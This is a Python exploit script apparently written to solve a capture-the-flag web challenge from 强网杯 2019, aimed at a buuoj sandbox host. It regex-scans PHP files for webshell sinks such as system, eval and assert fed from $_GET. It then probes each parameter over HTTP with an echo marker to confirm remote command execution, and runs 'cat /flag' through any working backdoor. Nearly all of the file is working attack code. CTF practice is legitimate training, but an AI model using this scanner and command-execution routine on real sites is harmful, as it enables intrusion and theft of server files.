#!/usr/bin/env python3
import sys
import os
import re
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.stdout.reconfigure(line_buffering=True)

BASE_URL = "http://904c5bf5-7217-4f7f-959b-c0a319b2a1ff.node5.buuoj.cn:81"
DELAY = 0.3  # 请求间隔
THREADS = 3  # 线程数

session = requests.Session()

def extract_params_from_file(filepath):
    """从PHP文件中提取所有可能的后门参数"""
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    params = set()

    # 匹配 system($_GET['xxx']), exec($_GET['xxx']), passthru($_GET['xxx']), shell_exec($_GET['xxx'])
    # 匹配 assert($_GET['xxx']), eval($_GET['xxx'])
    # 匹配 echo `{$_GET['xxx']}` (反引号执行)
    # 匹配 preg_replace("/xxx/e", $_GET['xxx'], ...) (e修饰符)

    patterns = [
        r'system\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'exec\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'passthru\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'shell_exec\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'assert\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'eval\s*\(\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'`\s*\{\s*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\}\s*`',
        r'preg_replace\s*\([^)]*\/e[^)]*\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
    ]

    for pattern in patterns:
        matches = re.findall(pattern, content)
        params.update(matches)

    return list(params)

def test_param(filename, param):
    """测试单个参数是否可执行命令"""
    marker = f"MARKER_{filename[:6]}_{param[:8]}"
    url = f"{BASE_URL}/{filename}?{param}=echo%20{marker}"

    try:
        r = session.get(url, timeout=10)
        if r.status_code == 429:
            print(f"[429] Rate limited, waiting...")
            time.sleep(30)
            return None
        time.sleep(DELAY)

        if marker in r.text:
            return (filename, param, True)
        return (filename, param, False)
    except Exception as e:
        return (filename, param, False)

def main():
    src_dir = "/home/kali/workspace/challenges/154_强网杯_2019_高明的黑客/src"

    # 收集所有文件和参数
    all_tests = []
    php_files = [f for f in os.listdir(src_dir) if f.endswith('.php')]
    print(f"[*] Found {len(php_files)} PHP files")

    for php_file in php_files:
        filepath = os.path.join(src_dir, php_file)
        params = extract_params_from_file(filepath)
        for param in params:
            all_tests.append((php_file, param))

    print(f"[*] Total {len(all_tests)} params to test")
    print(f"[*] Starting dynamic test with {THREADS} threads, {DELAY}s delay...")

    found = []
    tested = 0

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(test_param, f, p): (f, p) for f, p in all_tests}

        for future in as_completed(futures):
            tested += 1
            result = future.result()
            if result and result[2]:  # Found!
                found.append((result[0], result[1]))
                print(f"\n[+] FOUND: {result[0]}?{result[1]}=echo MARKER")
                # 立即尝试获取flag
                flag_url = f"{BASE_URL}/{result[0]}?{result[1]}=cat%20/flag"
                try:
                    r = session.get(flag_url, timeout=10)
                    print(f"[+] Flag response:\n{r.text[:500]}")
                except Exception as e:
                    print(f"[-] Error getting flag: {e}")

            if tested % 50 == 0:
                print(f"[*] Progress: {tested}/{len(all_tests)} ({100*tested/len(all_tests):.1f}%)")

    print(f"\n[*] Test completed. Found {len(found)} working backdoors:")
    for f, p in found:
        print(f"    {f}?{p}=command")

if __name__ == "__main__":
    main()
